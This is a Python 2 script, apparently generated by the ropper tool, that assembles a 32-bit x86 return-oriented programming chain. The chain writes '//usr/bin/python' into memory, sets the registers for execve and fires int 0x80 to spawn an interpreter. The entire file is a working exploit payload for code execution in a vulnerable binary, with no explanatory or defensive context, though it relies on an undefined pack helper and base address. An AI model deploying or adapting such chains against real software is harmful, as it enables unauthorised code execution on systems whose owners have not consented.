#!/usr/bin/env python
# Generated by ropper ropchain generator #
p = lambda x : pack('I', x)

rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''
rop += '//us'
rop += rebase_0(0x00001aab) # 0x08049aab: pop edi; ret; 
rop += rebase_0(0x00091060)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += 'r/bi'
rop += rebase_0(0x00001aab) # 0x08049aab: pop edi; ret; 
rop += rebase_0(0x00091064)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += 'n/py'
rop += rebase_0(0x00001aab) # 0x08049aab: pop edi; ret; 
rop += rebase_0(0x00091068)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += 'thon'
rop += rebase_0(0x00001aab) # 0x08049aab: pop edi; ret; 
rop += rebase_0(0x0009106c)
rop += rebase_0(0x00056e71) # 0x0809ee71: mov dword ptr [edi], ebx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x0000ded0) # 0x08055ed0: xor eax, eax; ret; 
rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
rop += rebase_0(0x00091070)
rop += rebase_0(0x0000e915) # 0x08056915: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00026882) # 0x0806e882: pop ecx; pop ebx; ret; 
rop += rebase_0(0x00091070)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += rebase_0(0x00091060)
rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
rop += rebase_0(0x00091070)
rop += rebase_0(0x0000ded0) # 0x08055ed0: xor eax, eax; ret; 
rop += rebase_0(0x0004a720) # 0x08092720: add eax, 1; ret; 
rop += rebase_0(0x0004a720) # 0x08092720: add eax, 1; ret; 
rop += rebase_0(0x0004a720) # 0x08092720: add eax, 1; ret; 
rop += rebase_0(0x0004a720) # 0x08092720: add eax, 1; ret; 
rop += rebase_0(0x0004a720) # 0x08092720: add eax, 1; ret; 
rop += rebase_0(0x0004a720) # 0x08092720: add eax, 1; ret; 
rop += rebase_0(0x0004a720) # 0x08092720: add eax, 1; ret; 
rop += rebase_0(0x0004a720) # 0x08092720: add eax, 1; ret; 
rop += rebase_0(0x0004a720) # 0x08092720: add eax, 1; ret; 
rop += rebase_0(0x0004a720) # 0x08092720: add eax, 1; ret; 
rop += rebase_0(0x0004a720) # 0x08092720: add eax, 1; ret; 
rop += rebase_0(0x00027190) # 0x0806f190: int 0x80; ret; 
print rop